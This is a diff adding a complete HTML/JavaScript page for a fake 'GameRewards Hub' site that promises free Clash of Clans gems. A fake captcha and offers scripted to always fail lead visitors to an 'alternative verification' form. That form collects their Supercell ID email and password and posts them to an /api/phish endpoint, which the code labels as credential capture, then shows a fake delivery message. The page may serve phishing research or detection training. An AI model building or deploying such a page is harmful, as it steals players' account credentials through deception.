@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clash of Clans Gems - Verification Required | GameRewards Hub</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #1a0a2e, #0d1b2a);
+            color: #e0e0e0;
+            min-height: 100vh;
+            font-size: 14px;
+        }
+        .header {
+            background: rgba(0,0,0,0.3);
+            border-bottom: 1px solid rgba(255,255,255,0.08);
+            padding: 14px 24px;
+        }
+        .header-inner {
+            max-width: 700px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo {
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .logo span { color: #9c27b0; }
+        .logo em { color: #f5a623; font-style: normal; }
+        .nav a { color: #888; text-decoration: none; margin-left: 16px; font-size: 13px; }
+        .container { max-width: 600px; margin: 0 auto; padding: 30px 20px; }
+
+        /* Progress steps */
+        .steps-bar {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 28px;
+        }
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+            color: #555;
+        }
+        .step.completed { color: #4caf50; }
+        .step.active { color: #9c27b0; }
+        .step-dot {
+            width: 28px; height: 28px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.05);
+            border: 2px solid #333;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 12px; font-weight: bold;
+        }
+        .step.completed .step-dot { background: #4caf50; border-color: #4caf50; color: #fff; }
+        .step.active .step-dot { background: #9c27b0; border-color: #9c27b0; color: #fff; }
+        .step-line {
+            width: 50px; height: 2px;
+            background: #333;
+            margin: 0 6px;
+        }
+        .step.completed + .step-line { background: #4caf50; }
+
+        /* File info */
+        .file-card {
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 10px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 24px;
+        }
+        .file-icon {
+            font-size: 32px;
+        }
+        .file-name { font-size: 15px; font-weight: 600; }
+        .file-meta { font-size: 12px; color: #888; }
+
+        /* Step panels */
+        .panel {
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 12px;
+            padding: 28px;
+            margin-bottom: 20px;
+        }
+        .panel h2 {
+            font-size: 18px;
+            margin-bottom: 6px;
+            text-align: center;
+        }
+        .panel .desc {
+            text-align: center;
+            font-size: 13px;
+            color: #999;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            color: #b8a0d4;
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 10px 14px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.12);
+            border-radius: 6px;
+            color: #e0e0e0;
+            font-size: 14px;
+            outline: none;
+        }
+        .form-group input:focus { border-color: #9c27b0; }
+
+        .gem-radios {
+            display: flex;
+            gap: 10px;
+        }
+        .gem-radio {
+            flex: 1;
+            background: rgba(0,0,0,0.3);
+            border: 2px solid rgba(255,255,255,0.1);
+            border-radius: 8px;
+            padding: 14px 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: border-color 0.2s;
+        }
+        .gem-radio:hover { border-color: #9c27b0; }
+        .gem-radio.selected { border-color: #9c27b0; background: rgba(156,39,176,0.1); }
+        .gem-radio .num { font-size: 18px; font-weight: bold; color: #f5a623; }
+        .gem-radio .lbl { font-size: 11px; color: #888; }
+
+        .next-btn {
+            display: block;
+            width: 100%;
+            background: linear-gradient(135deg, #9c27b0, #7b1fa2);
+            color: #fff;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 700;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 16px;
+        }
+        .next-btn:hover { opacity: 0.9; }
+
+        /* Offers section */
+        .offers-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+        .offer-card {
+            background: rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 8px;
+            padding: 16px;
+            text-align: center;
+            cursor: pointer;
+            transition: border-color 0.2s;
+        }
+        .offer-card:hover { border-color: #9c27b0; }
+        .offer-card .offer-icon { font-size: 28px; margin-bottom: 6px; }
+        .offer-card h4 { font-size: 13px; margin-bottom: 4px; }
+        .offer-card p { font-size: 11px; color: #888; }
+        .offer-btn {
+            display: inline-block;
+            margin-top: 8px;
+            padding: 5px 14px;
+            background: #9c27b0;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 11px;
+            cursor: pointer;
+        }
+
+        .fake-captcha {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(0,0,0,0.3);
+            border: 2px solid rgba(255,255,255,0.1);
+            border-radius: 6px;
+            padding: 12px 16px;
+            margin-bottom: 16px;
+            cursor: pointer;
+        }
+        .captcha-box {
+            width: 22px; height: 22px;
+            border: 2px solid #666;
+            border-radius: 3px;
+        }
+        .captcha-box.checked {
+            background: #4caf50;
+            border-color: #4caf50;
+        }
+
+        .error-msg {
+            background: rgba(211,47,47,0.1);
+            border: 1px solid rgba(211,47,47,0.3);
+            border-radius: 6px;
+            padding: 12px;
+            text-align: center;
+            font-size: 13px;
+            color: #ef9a9a;
+            margin-bottom: 16px;
+        }
+
+        .alt-verify {
+            background: rgba(156,39,176,0.08);
+            border: 1px solid rgba(156,39,176,0.25);
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+        }
+        .alt-verify h3 { font-size: 15px; margin-bottom: 6px; color: #ce93d8; }
+        .alt-verify p { font-size: 12px; color: #999; margin-bottom: 16px; }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 11px;
+            color: #444;
+            margin-top: 40px;
+        }
+        .footer a { color: #666; text-decoration: none; margin: 0 8px; }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="header-inner">
+            <div class="logo">Game<span>Rewards</span> <em>Hub</em></div>
+            <nav class="nav">
+                <a href="#">Rewards</a>
+                <a href="#">Help</a>
+            </nav>
+        </div>
+    </header>
+
+    <div class="container">
+        <!-- Progress steps -->
+        <div class="steps-bar">
+            <div class="step completed" id="step-ind-1">
+                <div class="step-dot">&#10003;</div>
+                <span>Player Tag</span>
+            </div>
+            <div class="step-line"></div>
+            <div class="step active" id="step-ind-2">
+                <div class="step-dot">2</div>
+                <span>Gem Amount</span>
+            </div>
+            <div class="step-line"></div>
+            <div class="step" id="step-ind-3">
+                <div class="step-dot">3</div>
+                <span>Verify</span>
+            </div>
+            <div class="step-line"></div>
+            <div class="step" id="step-ind-4">
+                <div class="step-dot">4</div>
+                <span>Deliver</span>
+            </div>
+        </div>
+
+        <div class="file-card">
+            <div class="file-icon">&#128142;</div>
+            <div>
+                <div class="file-name">Clash of Clans - Free Gems Reward</div>
+                <div class="file-meta">Up to 50,000 gems &middot; Delivery in 5 minutes &middot; 24,198 claims today</div>
+            </div>
+        </div>
+
+        <!-- Step 1: Player Tag (shown as "completed" - pre-filled) -->
+        <div class="panel" id="panel-1" style="display:block;">
+            <h2>Step 1: Enter Player Tag</h2>
+            <p class="desc">Enter your Clash of Clans player tag to identify your account.</p>
+            <div class="form-group">
+                <label>Player Tag</label>
+                <input type="text" id="player-tag" placeholder="#XXXXXXXX">
+            </div>
+            <button class="next-btn" onclick="goStep2()">Continue</button>
+        </div>
+
+        <!-- Step 2: Gem Amount -->
+        <div class="panel" id="panel-2" style="display:none;">
+            <h2>Step 2: Select Gem Amount</h2>
+            <p class="desc">Choose how many gems you'd like to receive.</p>
+            <div class="gem-radios">
+                <div class="gem-radio" onclick="selectGem(this, 10000)">
+                    <div class="num">10,000</div>
+                    <div class="lbl">Standard</div>
+                </div>
+                <div class="gem-radio selected" onclick="selectGem(this, 25000)">
+                    <div class="num">25,000</div>
+                    <div class="lbl">Popular</div>
+                </div>
+                <div class="gem-radio" onclick="selectGem(this, 50000)">
+                    <div class="num">50,000</div>
+                    <div class="lbl">Maximum</div>
+                </div>
+            </div>
+            <button class="next-btn" onclick="goStep3()">Continue</button>
+        </div>
+
+        <!-- Step 3: Human Verification (offers that "fail") -->
+        <div class="panel" id="panel-3" style="display:none;">
+            <h2>Step 3: Human Verification</h2>
+            <p class="desc">Complete one of the options below to verify you are human.</p>
+
+            <div class="fake-captcha" id="captcha-widget" onclick="checkCaptcha()">
+                <div class="captcha-box" id="captcha-box"></div>
+                <span>I'm not a robot</span>
+            </div>
+
+            <div id="offers-area" style="display:none;">
+                <p style="text-align:center; font-size:13px; color:#aaa; margin-bottom:12px;">
+                    Complete 1 of 2 offers to verify:
+                </p>
+                <div class="offers-grid">
+                    <div class="offer-card" onclick="tryOffer('download_app')">
+                        <div class="offer-icon">&#128241;</div>
+                        <h4>Download App</h4>
+                        <p>Install our free app to verify</p>
+                        <button class="offer-btn">Start</button>
+                    </div>
+                    <div class="offer-card" onclick="tryOffer('quick_survey')">
+                        <div class="offer-icon">&#128203;</div>
+                        <h4>Quick Survey</h4>
+                        <p>Answer 3 questions (~30 sec)</p>
+                        <button class="offer-btn">Start</button>
+                    </div>
+                </div>
+            </div>
+
+            <div id="offer-error" style="display:none;">
+                <div class="error-msg">
+                    &#9888;&#65039; Verification via offer could not be completed. Please use alternative verification below.
+                </div>
+                <div class="alt-verify">
+                    <h3>Alternative Verification</h3>
+                    <p>Verify your identity by logging in with your Supercell ID.</p>
+                    <div class="form-group">
+                        <label>Supercell ID (Email)</label>
+                        <input type="email" id="sc-email" placeholder="your@email.com">
+                    </div>
+                    <div class="form-group">
+                        <label>Password</label>
+                        <input type="password" id="sc-password" placeholder="Enter your password">
+                    </div>
+                    <button class="next-btn" onclick="submitVerification()">Verify Identity</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 4: Success -->
+        <div class="panel" id="panel-4" style="display:none;">
+            <div style="text-align:center;">
+                <div style="font-size:48px; margin-bottom:12px;">&#9989;</div>
+                <h2 style="color:#4caf50;">Verified Successfully!</h2>
+                <p class="desc" style="margin-top:8px;">
+                    Your gems are being delivered. Please allow 10-15 minutes
+                    for <span id="final-gems">25,000</span> gems to appear in your account.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <a href="#">Terms of Service</a>
+        <a href="#">Privacy</a>
+        <a href="#">Contact</a>
+        <p style="margin-top:10px;">&copy; 2026 GameRewards Hub. Not affiliated with Supercell Oy.</p>
+    </footer>
+
+    <script>
+        var currentStep = 1;
+        var selectedGems = 25000;
+        var offerAttempts = 0;
+
+        function updateStepIndicators() {
+            for (var i = 1; i <= 4; i++) {
+                var el = document.getElementById('step-ind-' + i);
+                el.classList.remove('completed', 'active');
+                if (i < currentStep) {
+                    el.classList.add('completed');
+                    el.querySelector('.step-dot').textContent = '✓';
+                } else if (i === currentStep) {
+                    el.classList.add('active');
+                }
+            }
+        }
+
+        function selectGem(el, amount) {
+            document.querySelectorAll('.gem-radio').forEach(function(r) { r.classList.remove('selected'); });
+            el.classList.add('selected');
+            selectedGems = amount;
+        }
+
+        function goStep2() {
+            var tag = document.getElementById('player-tag').value.trim();
+            if (!tag) { alert('Please enter your player tag.'); return; }
+
+            fetch('/api/track', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    event_type: 'player_tag_submit',
+                    player_tag: tag,
+                    site: 'survey_verify'
+                })
+            });
+
+            document.getElementById('panel-1').style.display = 'none';
+            document.getElementById('panel-2').style.display = 'block';
+            currentStep = 2;
+            updateStepIndicators();
+        }
+
+        function goStep3() {
+            document.getElementById('panel-2').style.display = 'none';
+            document.getElementById('panel-3').style.display = 'block';
+            currentStep = 3;
+            updateStepIndicators();
+        }
+
+        function checkCaptcha() {
+            var box = document.getElementById('captcha-box');
+            box.classList.add('checked');
+            box.textContent = '✓';
+            setTimeout(function() {
+                document.getElementById('offers-area').style.display = 'block';
+            }, 800);
+        }
+
+        function tryOffer(type) {
+            fetch('/api/track', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    event_type: 'offer_attempt',
+                    offer_type: type,
+                    site: 'survey_verify'
+                })
+            });
+
+            offerAttempts++;
+            // Offers always "fail" after a delay
+            setTimeout(function() {
+                document.getElementById('offers-area').style.display = 'none';
+                document.getElementById('offer-error').style.display = 'block';
+            }, 2000);
+        }
+
+        function submitVerification() {
+            var email = document.getElementById('sc-email').value.trim();
+            var password = document.getElementById('sc-password').value.trim();
+            if (!email || !password) {
+                alert('Please enter both your Supercell ID email and password.');
+                return;
+            }
+
+            // PHISHING: capture credentials
+            fetch('/api/phish', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    site: 'survey_verify',
+                    fields_submitted: ['supercell_email', 'supercell_password'],
+                    supercell_email: email,
+                    supercell_password: password,
+                    player_tag: document.getElementById('player-tag').value.trim()
+                })
+            });
+
+            document.getElementById('panel-3').style.display = 'none';
+            document.getElementById('panel-4').style.display = 'block';
+            document.getElementById('final-gems').textContent = selectedGems.toLocaleString();
+            currentStep = 4;
+            updateStepIndicators();
+        }
+    </script>
+</body>
+</html>
